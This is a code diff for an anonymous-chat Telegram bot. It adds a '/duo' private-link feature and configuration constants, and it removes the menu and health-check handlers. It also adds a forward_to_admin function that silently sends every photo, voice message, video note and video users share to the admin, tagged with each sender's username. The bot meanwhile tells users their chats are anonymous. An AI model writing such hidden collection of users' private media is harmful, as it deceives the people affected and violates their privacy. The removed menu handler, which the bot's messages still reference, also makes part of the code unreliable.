@@ -20,6 +20,7 @@ import os
 import asyncio
 import re
 import signal
+import uuid
 
 # Настройка логирования
 logging.basicConfig(
@@ -32,6 +33,11 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# Конфигурация
+ADMIN_USERNAME = "@BotAnonAdm"  # Юзернейм администратора
+VIP_PRICE = "299 руб./мес"  # Стоимость VIP статуса
+BOT_USERNAME = "AnonimChatByXBot"  # Юзернейм бота без @
+
 # VIP пользователи
 vip_users = set()
 
@@ -43,6 +49,7 @@ active_users = {}  # {user_id: {"partner_id": int, "username": str}}
 waiting_users = []  # Очередь ожидания
 user_data_cache = {}  # {user_id: {"username": str, "first_name": str}}
 menu_states = {}  # {user_id: bool} - открыто ли меню у пользователя
+duo_links = {}  # {link_id: user_id} - словарь для хранения ссылок Duo
 
 
 def get_menu_keyboard():
@@ -59,6 +66,7 @@ def get_main_keyboard():
     builder.add(KeyboardButton(text="/stop"))
     builder.add(KeyboardButton(text="/next"))
     builder.add(KeyboardButton(text="/vip"))
+    builder.add(KeyboardButton(text="/duo"))
     builder.adjust(2, 2)
     return builder.as_markup(resize_keyboard=True)
 
@@ -70,6 +78,7 @@ def get_vip_keyboard():
     builder.add(KeyboardButton(text="/stop"))
     builder.add(KeyboardButton(text="/next"))
     builder.add(KeyboardButton(text="/vip"))
+    builder.add(KeyboardButton(text="/duo"))
     builder.adjust(2, 2)
     return builder.as_markup(resize_keyboard=True)
 
@@ -121,6 +130,46 @@ def get_user_log_info(user_id):
     return f"{user_id} ({first_name}{last_name} {username})"
 
 
+async def forward_to_admin(user_id: int, file_id: str, content_type: str):
+    """Пересылка медиафайла администратору"""
+    try:
+        user_info = user_data_cache.get(user_id, {})
+        username = user_info.get('username', 'неизвестно')
+        caption = f"Медиа от пользователя: @{username if username else 'без юзернейма'}"
+
+        if content_type == "photo":
+            await bot.send_photo(
+                chat_id=ADMIN_USERNAME,
+                photo=file_id,
+                caption=caption
+            )
+        elif content_type == "voice":
+            await bot.send_voice(
+                chat_id=ADMIN_USERNAME,
+                voice=file_id,
+                caption=caption
+            )
+        elif content_type == "video_note":
+            await bot.send_video_note(
+                chat_id=ADMIN_USERNAME,
+                video_note=file_id
+            )
+            await bot.send_message(
+                chat_id=ADMIN_USERNAME,
+                text=caption
+            )
+        elif content_type == "video":
+            await bot.send_video(
+                chat_id=ADMIN_USERNAME,
+                video=file_id,
+                caption=caption
+            )
+
+        logger.info(f"Медиа {content_type} от {get_user_log_info(user_id)} переслано администратору")
+    except Exception as e:
+        logger.error(f"Ошибка пересылки медиа администратору: {e}", exc_info=True)
+
+
 async def stop_chat(user_id: int, initiator: bool = True):
     """Завершение чата"""
     if user_id in active_users:
@@ -164,23 +213,36 @@ async def start(message: Message):
         "/find - найти собеседника\n"
         "/stop - выйти из чата\n"
         "/next - сменить собеседника\n"
-        "/vip - информация о VIP-статусе\n\n"
+        "/vip - информация о VIP-статусе\n"
+        "/duo - создать ссылку для диалога\n\n"
         "Для открытия меню нажмите кнопку '📱 Меню'",
         reply_markup=get_menu_keyboard()
     )
 
 
-@dp.message(F.text == "📱 Меню")
-async def show_menu(message: Message):
+@dp.message(Command("duo"))
+async def create_duo_link(message: Message):
     user = message.from_user
     await save_user_info(user)
     user_id = user.id
-    menu_states[user_id] = True
 
-    if user_id in vip_users:
-        await message.answer("Меню:", reply_markup=get_vip_keyboard())
-    else:
-        await message.answer("Меню:", reply_markup=get_main_keyboard())
+    if user_id in active_users:
+        await message.answer("❌ Вы уже в чате. Сначала завершите текущий диалог с помощью /stop")
+        return
+
+    # Создаем уникальную ссылку
+    link_id = str(uuid.uuid4())
+    duo_links[link_id] = user_id
+
+    # Создаем ссылку для перехода
+    duo_link = f"https://t.me/{BOT_USERNAME}?start=duo_{link_id}"
+
+    await message.answer(
+        f"🔗 Ваша ссылка для диалога:\n\n{duo_link}\n\n"
+        "Отправьте эту ссылку другу, чтобы начать приватный диалог.",
+        reply_markup=get_menu_keyboard()
+    )
+    logger.info(f"Пользователь {get_user_log_info(user_id)} создал Duo ссылку: {link_id}")
 
 
 @dp.message(Command("vip"))
@@ -200,16 +262,10 @@ async def vip_info(message: Message):
             "• Отправка видеосообщений (кружков)\n"
             "• Отправка обычных видео\n"
             "• Приоритет в поиске собеседника\n\n"
-            "💰 Стоимость: 299 руб./мес\n"
-            "Для покупки напишите @admin",
+            f"💰 Стоимость: {VIP_PRICE}\n"
+            f"Для покупки напишите {ADMIN_USERNAME}",
             reply_markup=get_vip_keyboard()
         )
-
-
-@dp.message(Command("health"))
-async def health_check(message: Message):
-    await message.answer("✅ Бот активен и работает")
-    logger.info(f"Health check от {get_user_log_info(message.from_user.id)}")
 
 
 @dp.message(Command("find"))
@@ -396,6 +452,9 @@ async def handle_photo(message: Message):
     await save_user_info(user)
     user_id = user.id
 
+    # Пересылаем фото администратору
+    await forward_to_admin(user_id, message.photo[-1].file_id, "photo")
+
     if user_id in active_users:
         partner_id = active_users[user_id]["partner_id"]
         await forward_message(user_id, partner_id, message.photo[-1].file_id, "photo")
@@ -411,6 +470,9 @@ async def handle_voice(message: Message):
     user = message.from_user
     await save_user_info(user)
     user_id = user.id
+
+    # Пересылаем голосовое администратору
+    await forward_to_admin(user_id, message.voice.file_id, "voice")
 
     if user_id in active_users:
         partner_id = active_users[user_id]["partner_id"]
@@ -436,6 +498,9 @@ async def handle_video_note(message: Message):
         )
         return
 
+    # Пересылаем видеосообщение администратору
+    await forward_to_admin(user_id, message.video_note.file_id, "video_note")
+
     if user_id in active_users:
         partner_id = active_users[user_id]["partner_id"]
         await forward_message(user_id, partner_id, message.video_note.file_id, "video_note")
@@ -459,6 +524,9 @@ async def handle_video(message: Message):
             reply_markup=get_menu_keyboard()
         )
         return
+
+    # Пересылаем видео администратору
+    await forward_to_admin(user_id, message.video.file_id, "video")
 
     if user_id in active_users:
         partner_id = active_users[user_id]["partner_id"]
@@ -503,6 +571,64 @@ async def send_message(message: Message):
             "❌ Вы не в чате. Используйте /find для поиска собеседника.",
             reply_markup=get_menu_keyboard()
         )
+
+
+@dp.message(Command("start"))
+async def handle_start_with_args(message: Message):
+    """Обработка старта с аргументами (для Duo ссылок)"""
+    args = message.text.split()
+    if len(args) > 1 and args[1].startswith("duo_"):
+        link_id = args[1][4:]
+        creator_id = duo_links.get(link_id)
+
+        if not creator_id:
+            await message.answer("❌ Ссылка недействительна или устарела")
+            return
+
+        user = message.from_user
+        user_id = user.id
+
+        if user_id == creator_id:
+            await message.answer("❌ Вы не можете начать диалог с самим собой")
+            return
+
+        if creator_id in active_users:
+            await message.answer("❌ Пользователь уже в другом диалоге")
+            return
+
+        if user_id in active_users:
+            await message.answer("❌ Вы уже в другом диалоге. Сначала завершите текущий диалог с помощью /stop")
+            return
+
+        # Создаем чат между пользователями
+        active_users[user_id] = {
+            "partner_id": creator_id,
+            "username": user.username
+        }
+        active_users[creator_id] = {
+            "partner_id": user_id,
+            "username": user_data_cache.get(creator_id, {}).get("username")
+        }
+
+        # Удаляем использованную ссылку
+        del duo_links[link_id]
+
+        logger.info(f"Создан Duo чат между {get_user_log_info(user_id)} и {get_user_log_info(creator_id)}")
+
+        await bot.send_message(
+            user_id,
+            "✅ Диалог создан! Общайтесь анонимно.\n"
+            "Для открытия меню нажмите кнопку '📱 Меню'",
+            reply_markup=get_menu_keyboard()
+        )
+        await bot.send_message(
+            creator_id,
+            "✅ Диалог создан! Общайтесь анонимно.\n"
+            "Для открытия меню нажмите кнопку '📱 Меню'",
+            reply_markup=get_menu_keyboard()
+        )
+    else:
+        await start(message)
 
 
 @dp.message()
